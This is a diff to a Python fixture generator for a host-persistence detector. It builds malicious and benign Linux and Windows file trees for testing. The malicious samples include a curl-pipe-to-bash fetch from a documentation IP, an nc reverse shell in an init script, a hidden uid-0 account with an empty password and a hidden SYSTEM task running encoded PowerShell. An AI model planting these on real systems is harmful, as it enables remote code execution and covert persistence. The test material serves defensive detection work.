@@ -49,6 +49,21 @@ def w(tree: str, rel: str, content: str, mode: int | None = None) -> None:
         MODES.setdefault(tree, {})[rel.replace(os.sep, "/")] = mode
 
 
+def wb(tree: str, rel: str, data: bytes) -> None:
+    """Write a fixture file as raw bytes (used for UTF-16 Task Scheduler XML)."""
+    path = os.path.join(ROOT, tree, rel)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "wb") as fh:
+        fh.write(data)
+
+
+def w16(tree: str, rel: str, text: str) -> None:
+    """Write UTF-16LE with a BOM, which is how Task Scheduler stores definitions on a real
+    host. Exercising the collector's UTF-16 decoding against a realistic encoding matters:
+    a UTF-8-only parser silently fails on every real task file."""
+    wb(tree, rel, b"\xff\xfe" + text.replace("\n", "\r\n").encode("utf-16-le"))
+
+
 def empty(tree: str, note: str) -> None:
     """Create a deliberately empty tree, with a README explaining what it proves."""
     path = os.path.join(ROOT, tree)
@@ -428,6 +443,370 @@ type=SYSCALL msg=audit(1760003700.500:901): arch=c000003e syscall=257 success=ye
           "completely misleading.")
 
 
+# =========================================================================================
+# LNX-PERSIST-SHELLRC-001
+# =========================================================================================
+
+# A minimal but realistic passwd used by the fixtures that enumerate per-user files.
+PASSWD_BASIC = """\
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+alice:x:1000:1000:Alice:/home/alice:/bin/bash
+"""
+
+
+def shellrc() -> None:
+    t = "lnx-persist-shellrc-001/positive"
+    w(t, "etc/passwd", PASSWD_BASIC)
+    # Fetch-and-execute planted in a system-wide profile drop-in.
+    w(t, "etc/profile.d/99-system-health.sh", """\
+# System health reporter
+export HEALTH_ENDPOINT=https://health.internal.example
+curl -fsSL http://198.51.100.23/agent.sh | bash
+""")
+    # A payload executed from /tmp in a user's own rc file.
+    w(t, "home/alice/.bashrc", """\
+# ~/.bashrc
+[ -z "$PS1" ] && return
+alias ll='ls -alF'
+/bin/sh /tmp/.cache/.session-helper &
+""")
+
+    t = "lnx-persist-shellrc-001/negative"
+    w(t, "etc/passwd", PASSWD_BASIC)
+    w(t, "etc/profile", """\
+# /etc/profile: system-wide .profile file for the Bourne shell
+if [ "$(id -u)" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+else
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+fi
+export PATH
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  fi
+fi
+
+for i in /etc/profile.d/*.sh; do
+  if [ -r $i ]; then
+    . $i
+  fi
+done
+unset i
+""")
+    w(t, "etc/profile.d/01-locale-fix.sh", """\
+# Set a sane default locale
+if [ -z "$LANG" ]; then
+  export LANG=C.UTF-8
+fi
+""")
+    w(t, "etc/profile.d/bash_completion.sh", """\
+if [ -r /usr/share/bash-completion/bash_completion ]; then
+  . /usr/share/bash-completion/bash_completion
+fi
+""")
+    # Developer tooling initialisation -- the single most common legitimate modification
+    # of a user's rc file, and a case a naive check would flag.
+    w(t, "home/alice/.bashrc", """\
+# ~/.bashrc: executed by bash(1) for non-login shells.
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+HISTCONTROL=ignoreboth
+shopt -s histappend
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+alias ll='ls -alF'
+alias grep='grep --color=auto'
+
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
+[ -s "$NVM_DIR/bash_completion" ] && \\. "$NVM_DIR/bash_completion"
+
+export PYENV_ROOT="$HOME/.pyenv"
+command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"
+eval "$(pyenv init -)"
+
+. "$HOME/.cargo/env"
+""")
+
+    empty("lnx-persist-shellrc-001/nodata",
+          "Deliberately empty: no shell initialisation file exists anywhere on this host.\n"
+          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.")
+
+
+# =========================================================================================
+# LNX-PERSIST-RCSCRIPT-001
+# =========================================================================================
+
+def rcscript() -> None:
+    t = "lnx-persist-rcscript-001/positive"
+    w(t, "etc/rc.local", """\
+#!/bin/sh -e
+# rc.local
+/tmp/.systemd-private/update &
+exit 0
+""")
+    w(t, "etc/init.d/network-health", """\
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          network-health
+### END INIT INFO
+nc -e /bin/sh 198.51.100.23 4444 &
+""")
+
+    t = "lnx-persist-rcscript-001/negative"
+    w(t, "etc/rc.local", """\
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+
+exit 0
+""")
+    w(t, "etc/init.d/ssh", """\
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          sshd
+# Required-Start:    $remote_fs $syslog
+# Default-Start:     2 3 4 5
+### END INIT INFO
+
+set -e
+test -x /usr/sbin/sshd || exit 0
+umask 022
+
+if test -f /etc/default/ssh; then
+    . /etc/default/ssh
+fi
+
+. /lib/lsb/init-functions
+
+case "$1" in
+  start)
+        log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true
+        start-stop-daemon --start --quiet --oknodo --chuid 0:0 \\
+            --pidfile /run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS
+        ;;
+  stop)
+        start-stop-daemon --stop --quiet --oknodo --pidfile /run/sshd.pid
+        ;;
+esac
+exit 0
+""")
+    w(t, "etc/init.d/cron", """\
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          cron
+### END INIT INFO
+. /lib/lsb/init-functions
+case "$1" in
+  start)  start-stop-daemon --start --quiet --pidfile /run/crond.pid --name cron --startas /usr/sbin/cron -- -P ;;
+  stop)   start-stop-daemon --stop --quiet --pidfile /run/crond.pid --name cron ;;
+esac
+exit 0
+""")
+
+    empty("lnx-persist-rcscript-001/nodata",
+          "Deliberately empty: a pure-systemd host with no rc.local and no /etc/init.d.\n"
+          "Proves the check returns INSUFFICIENT_DATA. This is a common real case, and the\n"
+          "systemd check carries the persistence coverage on such a host.")
+
+
+# =========================================================================================
+# LNX-PERSIST-ACCOUNT-001
+# =========================================================================================
+
+def accounts() -> None:
+    t = "lnx-persist-account-001/positive"
+    # "sysupdate" is a second uid-0 account (ACCT-C1) with an EMPTY password (ACCT-C2).
+    w(t, "etc/passwd", """\
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+alice:x:1000:1000:Alice:/home/alice:/bin/bash
+sysupdate:x:0:0:System Update Service:/root:/bin/bash
+""")
+    # Password fields only. These are fixture values, not real hashes: "!" means locked,
+    # "$6$..." is a syntactically shaped placeholder, "" means NO PASSWORD REQUIRED.
+    w(t, "etc/shadow", """\
+root:!:19000:0:99999:7:::
+daemon:*:19000:0:99999:7:::
+www-data:*:19000:0:99999:7:::
+alice:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
+sysupdate::19000:0:99999:7:::
+""", mode=0o640)
+    w(t, "etc/group", """\
+root:x:0:
+daemon:x:1:
+sudo:x:27:alice
+www-data:x:33:
+alice:x:1000:
+""")
+
+    t = "lnx-persist-account-001/negative"
+    # A realistic, clean account set: a human admin in sudo (uid >= 1000, interactive),
+    # and service accounts that are nologin and NOT in privileged groups.
+    w(t, "etc/passwd", """\
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+postgres:x:102:105:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+alice:x:1000:1000:Alice Admin:/home/alice:/bin/bash
+bob:x:1001:1001:Bob:/home/bob:/bin/bash
+""")
+    w(t, "etc/shadow", """\
+root:!:19000:0:99999:7:::
+daemon:*:19000:0:99999:7:::
+bin:*:19000:0:99999:7:::
+sys:*:19000:0:99999:7:::
+sync:*:19000:0:99999:7:::
+www-data:*:19000:0:99999:7:::
+sshd:*:19000:0:99999:7:::
+systemd-network:*:19000:0:99999:7:::
+postgres:*:19000:0:99999:7:::
+alice:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
+bob:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
+""", mode=0o640)
+    w(t, "etc/group", """\
+root:x:0:
+daemon:x:1:
+sudo:x:27:alice
+www-data:x:33:
+adm:x:4:
+postgres:x:105:
+alice:x:1000:
+bob:x:1001:
+""")
+
+    empty("lnx-persist-account-001/nodata",
+          "Deliberately empty: no /etc/passwd, so no account database exists to examine.\n"
+          "Proves the check returns INSUFFICIENT_DATA rather than 'no suspicious accounts'.")
+
+
+# =========================================================================================
+# WIN-PERSIST-SERVICE-001
+# =========================================================================================
+
+def winservice() -> None:
+    # The service check reads only the registry, which the check's Cases() supplies via a
+    # FakeRegistry. The fixture trees exist so the filesystem root is valid.
+    for case, note in [
+        ("positive", "Service data comes from the FakeRegistry in persist_win2.go "
+                     "(ProgramData rundll32 service + hijacked svchost ServiceDll)."),
+        ("negative", "Service data comes from the FakeRegistry in persist_win2.go "
+                     "(stock spoolsv, svchost services with System32 ServiceDlls, a "
+                     "driver and an Edge updater)."),
+        ("nodata", "No registry is supplied, so the check must return INSUFFICIENT_DATA."),
+    ]:
+        empty("win-persist-service-001/" + case, note)
+
+
+# =========================================================================================
+# WIN-PERSIST-SCHTASK-001
+# =========================================================================================
+
+TASKS = "C/Windows/System32/Tasks"
+
+
+def _task_xml(author, userid, runlevel, hidden, command, arguments, trigger="LogonTrigger"):
+    return """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>2026-10-01T09:14:22</Date>
+    <Author>%s</Author>
+    <URI>\\%s</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <%s>
+      <Enabled>true</Enabled>
+    </%s>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>%s</UserId>
+      <RunLevel>%s</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <Enabled>true</Enabled>
+    <Hidden>%s</Hidden>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>%s</Command>
+      <Arguments>%s</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+""" % (author, author, trigger, trigger, userid, runlevel,
+       "true" if hidden else "false", command, arguments)
+
+
+def schtask() -> None:
+    t = "win-persist-schtask-001/positive"
+    # Hidden + SYSTEM + encoded PowerShell staged in %TEMP%: TASK-C1, C2 and C3.
+    # The base64 blob is inert filler, not a real payload.
+    w16(t, TASKS + "/SystemHealthCheck", _task_xml(
+        author="Microsoft Corporation",
+        userid="S-1-5-18", runlevel="HighestAvailable", hidden=True,
+        command="powershell.exe",
+        arguments="-NoProfile -WindowStyle Hidden -EncodedCommand "
+                  "SQBOAEUAUgBUAEYASQBYAFQAVQBSAEUAQgBMAE8AQgBOAE8AVABSAEUAQQBMAA== "
+                  "-File C:\\Users\\admin\\AppData\\Local\\Temp\\health.ps1"))
+
+    t = "win-persist-schtask-001/negative"
+    # The decisive negative cases: Microsoft's OWN maintenance tasks are hidden AND run as
+    # SYSTEM. A check that fires on "hidden" or on "SYSTEM" alone flags a stock install.
+    w16(t, TASKS + "/Microsoft/Windows/UpdateOrchestrator/Schedule Scan", _task_xml(
+        author="Microsoft Corporation",
+        userid="S-1-5-18", runlevel="HighestAvailable", hidden=True,
+        command="%systemroot%\\system32\\usoclient.exe", arguments="StartScan",
+        trigger="TimeTrigger"))
+    w16(t, TASKS + "/Microsoft/Windows/Defrag/ScheduledDefrag", _task_xml(
+        author="Microsoft Corporation",
+        userid="S-1-5-18", runlevel="LeastPrivilege", hidden=True,
+        command="%windir%\\system32\\defrag.exe", arguments="-c -h -o -$",
+        trigger="CalendarTrigger"))
+    # A real third-party updater: Program Files path, not hidden.
+    w16(t, TASKS + "/MicrosoftEdgeUpdateTaskMachineCore", _task_xml(
+        author="Microsoft Corporation",
+        userid="S-1-5-18", runlevel="HighestAvailable", hidden=False,
+        command="C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+        arguments="/c", trigger="CalendarTrigger"))
+    # A task that merely WRITES a log into %TEMP% -- must not match TASK-C1, because the
+    # criterion is about executing from a staging directory, not writing to one.
+    w16(t, TASKS + "/VendorAgent/CollectDiagnostics", _task_xml(
+        author="Example Vendor Ltd",
+        userid="S-1-5-18", runlevel="LeastPrivilege", hidden=False,
+        command="C:\\Program Files\\ExampleVendor\\agent.exe",
+        arguments="--collect --out C:\\Windows\\Temp\\vendor-diag.log",
+        trigger="CalendarTrigger"))
+
+    empty("win-persist-schtask-001/nodata",
+          "Deliberately empty: no Task Scheduler folder exists.\n"
+          "Proves the check returns INSUFFICIENT_DATA rather than reporting a Windows host\n"
+          "as free of scheduled-task persistence on the basis of never having looked.")
+
+
 def main() -> int:
     if os.path.isdir(ROOT):
         shutil.rmtree(ROOT)
@@ -438,6 +817,19 @@ def main() -> int:
     sshkeys()
     runkey()
     auditd()
+    shellrc()
+    rcscript()
+    accounts()
+    winservice()
+    schtask()
+    for case, note in [
+        ("positive", "Load-point data comes from the FakeRegistry in persist_win3.go "
+                     "(appended Userinit, rogue password filter, IFEO Debugger)."),
+        ("negative", "Load-point data comes from the FakeRegistry in persist_win3.go "
+                     "(modern Windows defaults, benign IFEO subkeys)."),
+        ("nodata", "No registry is supplied, so the check must return INSUFFICIENT_DATA."),
+    ]:
+        empty("win-persist-regloadpoint-001/" + case, note)
 
     for tree, modes in sorted(MODES.items()):
         path = os.path.join(ROOT, tree, "modes.json")
